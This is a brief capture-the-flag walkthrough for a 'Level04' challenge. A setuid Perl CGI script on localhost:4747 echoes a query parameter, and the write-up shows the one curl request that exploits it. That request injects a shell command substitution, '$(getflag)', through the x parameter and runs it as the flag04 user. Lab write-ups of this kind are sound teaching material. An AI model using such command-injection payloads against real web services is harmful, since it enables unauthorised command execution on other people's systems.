# Level04
## Step by step
- In the user `level04` home directory, there is a file
  ```bash
  > ls -la
  -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
  ```
- It a program in perl that listen on port localhost:4747 and run a CGI that take a querystring `x` in parameter and print it as the owner of the file, in this case `flag04`
- Lets send a requet to locahost:4747 woth a querystring x.
  ``` bash
  > curl http://localhost:4747/?x='$(getflag)'
  Check flag.Here is your token : XXX
  ```
